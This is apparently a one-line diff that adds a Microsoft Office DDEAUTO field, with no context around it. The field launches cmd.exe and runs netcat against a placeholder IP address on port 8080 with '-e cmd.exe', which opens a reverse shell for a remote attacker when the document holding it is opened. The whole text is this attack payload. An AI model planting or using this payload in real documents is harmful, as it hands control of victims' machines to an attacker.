@@ -1,0 +1,1 @@
+{DDEAUTO c:\\windows\\system32\\cmd.exe "/K nc.exe -vn (IP Address) 8080 -e cmd.exe}
